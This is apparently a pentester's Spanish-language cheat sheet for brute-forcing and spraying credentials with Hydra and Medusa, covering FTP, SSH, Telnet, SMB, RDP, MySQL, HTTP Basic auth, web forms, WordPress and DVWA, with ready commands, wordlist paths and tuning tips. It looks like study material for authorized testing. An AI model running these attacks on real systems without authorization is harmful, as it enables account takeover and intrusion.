# Fuerza Bruta de Credenciales

Tags: #Hydra #Medusa #BruteForce #Spraying #Credenciales #Autenticacion

## OBJETIVO
- Encontrar credenciales válidas en servicios de autenticación
- Realizar password spraying sin bloquear cuentas
- Atacar formularios web con parámetros específicos
- Reutilizar credenciales encontradas en otros servicios

## TIPS
1. **Probar credenciales por defecto SIEMPRE antes de fuerza bruta → más rápido, menos ruido**
2. **Validar con nxc antes de usar Hydra en SMB/WinRM → más fiable**
3. **-t 4 para FTP/Telnet → cortan conexiones con demasiados hilos**
4. **-t 15-30 para SSH/HTTP → balance velocidad/estabilidad**
5. **-f → detener al primer éxito | -F → detener si cualquier usuario es válido**
6. **-I → saltar espera inicial | -V → ver cada intento**
7. **Para HTTP → capturar el request con Burp primero → identificar campos y mensaje de error**
8. **SMBv1 → Hydra NO funciona → usar nxc o Metasploit**
9. **-e nsr → probar siempre: n=null, s=user_as_pass, r=reversed → antes de wordlist grande**

## TOOLS
* [Medusa](https://github.com/jmk-foofus/medusa) → alternativa más estable en algunos servicios

---

## WORDLISTS DE REFERENCIA RÁPIDA

```bash
# Contraseñas
/usr/share/wordlists/rockyou.txt                                              # Principal
/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt         # Top 10k
/usr/share/seclists/Passwords/Common-Credentials/best110.txt                  # Rápida
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
/usr/share/seclists/Passwords/months.txt                                      # Meses
/usr/share/seclists/Passwords/seasons.txt                                     # Estaciones
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
/usr/share/wordlists/metasploit/common_passwords.txt

# Usuarios
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt               # Grande
/usr/share/seclists/Usernames/top-usernames-shortlist.txt                     # Rápida
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
/usr/share/wordlists/metasploit/common_users.txt

# Específicas por servicio
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt
/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

---

## REFERENCIA DE FLAGS

```bash
-l <user>     # Usuario único
-L <file>     # Lista de usuarios
-p <pass>     # Contraseña única
-P <file>     # Lista de contraseñas
-C <file>     # Archivo con formato user:pass → más rápido que -L -P
-t <n>        # Hilos paralelos (default: 16)
-f            # Detener al encontrar primera credencial válida
-F            # Detener si cualquier usuario es válido
-I            # Saltar espera inicial
-V            # Verbose → ver cada intento
-v            # Verbose reducido
-s <port>     # Puerto no estándar
-o <file>     # Guardar resultados a archivo
-e nsr        # Extras: n=null pass, s=user as pass, r=reversed user
-w <n>        # Tiempo de espera entre intentos (segundos)
-W <n>        # Tiempo entre cada hilo
```

---

## 1. SERVICIOS DE RED

### FTP (Puerto 21)
```bash
❯ hydra -L users.txt -p ' ' <IP> ftp -t 4
# Sin contraseña → espacio vacío | -t 4 → evitar desconexiones

❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://<IP> -t 15
# Usuario conocido → buscar contraseña

❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt   -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt   <IP> ftp -t 4 -I
# Lista de usuarios y contraseñas | -I → saltar espera

❯ medusa -h <IP> -U users.txt -P /usr/share/wordlists/rockyou.txt -M ftp -t 4
# Alternativa con medusa → más estable en FTP
```

### SSH (Puerto 22)
```bash
❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
# Usuario root | -t 4 → SSH suele tener protección anti-brute

❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4 -V
# -V → ver cada intento | útil para depurar

❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4 -V -s 2222
# -s 2222 → puerto SSH no estándar

❯ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4 -f
# Lista de usuarios | -f → detener al primer éxito

❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt   -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt   ssh://<IP> -t 4 -e nsr
# -e nsr → probar null, user=pass, reversed antes de wordlist

❯ medusa -h <IP> -U users.txt -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
# Alternativa con medusa
```

### Alternativa si SSH es muy antiguo en la víctima 
```python 
# Configurar SSH localmente (Kali)
cat > ~/.ssh/config << 'EOF'
Host 192.168.208.39
    HostKeyAlgorithms ssh-rsa
    KexAlgorithms diffie-hellman-group1-sha1
    MACs hmac-sha1,hmac-md5
EOF

❯ chmod 600 ~/.ssh/config
```


### Telnet (Puerto 23)
```bash
❯ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt   -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt   <IP> telnet -t 4
# -t 4 → Telnet es sensible a demasiados hilos
```

### SMB (Puerto 445)
```bash
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<IP>
# SMBv2/v3 → hydra funciona | SMBv1 → usar nxc o Metasploit

❯ hydra -L users.txt -P passwords.txt smb://<IP>
# Lista de usuarios y contraseñas

❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb
# Sintaxis alternativa
```

### RDP (Puerto 3389)
```bash
❯ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt   -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt   rdp://<IP>
# Puerto 3389 por defecto

❯ hydra -L users.txt -P passwords.txt rdp://<IP> -s 3333
# -s → puerto no estándar (3333, 3390, etc.)
```

### MySQL (Puerto 3306)
```bash
❯ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt   mysql://<IP>
# Usuario root → wordlist de contraseñas

❯ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt   <IP> mysql
# Sintaxis alternativa → mismo resultado
```

---

## 2. AUTENTICACIÓN HTTP BÁSICA (POPUP DEL NAVEGADOR)

```bash
# El navegador muestra un popup de usuario/contraseña → Basic Auth
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /<DIR>/
# DIR → ruta donde está la autenticación (/admin/, /webdav/, /manager/)

❯ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt <IP> http-get /admin/
# Lista de usuarios

❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP>   -s 8080 http-get /manager/html/
# Puerto no estándar → Tomcat en 8080

❯ hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt   -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt   <IP> -s 8080 http-get /manager/html/
# Tomcat → credenciales por defecto específicas

❯ hydra -L /usr/share/wordlists/metasploit/common_users.txt   -P /usr/share/wordlists/metasploit/common_passwords.txt   <IP> http-get /webdav/
# WebDAV → autenticación básica
```

---

## 3. FORMULARIOS WEB (POST)

### Cómo obtener los campos correctos
```
1. Burp Suite → interceptar el request de login → ver el body POST
2. Ctrl+U → código fuente → buscar <form action=""> y los <input name="">
3. Inspector → Network → ver la petición POST al hacer login fallido
   → anotar: ruta, nombres de campos, mensaje de error
```

### Estructura del módulo http-post-form
```
"/ruta:campo_user=^USER^&campo_pass=^PASS^:F=mensaje_error_fallo"
   ↑ ruta del form    ↑ campos (de Burp o fuente)    ↑ texto en fallo

# Alternativa con código de éxito en vez de mensaje de fallo:
"/ruta:campos:S=código_éxito"   # S=302 cuando el login exitoso redirige
```

### Formulario genérico
```bash
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP>   http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid"   -V -I -t 4
# Ajustar campos y mensaje de error según la app

❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP>   http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:F=Invalid credentials or user not activated!"
# Incluir campos ocultos del formulario → crítico para que funcione
```

### WordPress
```bash
# PASO 1 → Enumerar usuarios válidos primero
❯ hydra -L users.txt -p fakepwd <IP>   http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username'
# -p fakepwd → contraseña falsa → solo buscamos el usuario
# F=Invalid username → cuando el usuario NO existe

❯ hydra -L users.txt -p fakepwd <IP>   http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
# Con wp-submit incluido → más preciso

# PASO 2 → Crackear contraseña del usuario encontrado
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt   <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302'
# S=302 → login exitoso redirige con 302

❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt   <IP> http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -t 15
# F=is incorrect → texto de error en login fallido | -t 15 → 15 hilos
```

### CMS Genérico
```bash
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP>   http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect"   -t 64 -F
# -t 64 → muchos hilos para CMS | -F → parar al primer éxito
```

---

## 4. FORMULARIOS WEB CON COOKIE DE SESIÓN (CSRF / DVWA)

```bash
# Cuando la app requiere cookie de sesión activa (CSRF token, PHPSESSID)
# Obtener la cookie de: Inspector → Storage → Cookies

❯ hydra -l admin -P /usr/share/wordlists/john.lst   'http-get-form://IP:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=aaabbbccc; security=low:F=Username and/or password incorrect'
# H=Cookie → incluir cookie de sesión | security=low → nivel DVWA

❯ hydra -l admin -P /usr/share/wordlists/john.lst   'http-get-form://IP:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=aaabbbccc; security=medium:F=Username and/or password incorrect'   -V -I
# security=medium → nivel medio DVWA | -V -I → verbose + saltar espera
```

### Insight
- PHPSESSID cambia al expirar → obtener nueva sesión activa antes de cada intento
- Si el CSRF token cambia en cada request → usar ffuf con modo cluster bomb

---

## CONDICIONES CLAVE
- FTP / Telnet → -t 4 → evitar desconexiones
- SSH → -t 4 → protección anti-brute en la mayoría
- HTTP POST → capturar con Burp primero → campos exactos
- WordPress → dos pasos: usuarios primero → luego contraseñas
- SMBv1 → no usar Hydra → usar nxc o Metasploit
- Login con cookie → H=Cookie con sesión activa vigente
- S= para éxito por código | F= para fallo por texto → elegir según la app

## ONE-LINERS MENTALES
- Credenciales por defecto primero → siempre antes de fuerza bruta
- -e nsr → siempre agregarlo → prueba null, user=pass, reversed
- HTTP form → Burp primero → campos exactos → luego hydra
- WordPress → usuarios con F=Invalid username → pass con S=302
- SMB → nxc en vez de hydra → más fiable y más información
- Muchos fallos → revisar el mensaje F= → puede estar mal copiado
- -o resultados.txt → siempre guardar → no perder credenciales encontradas
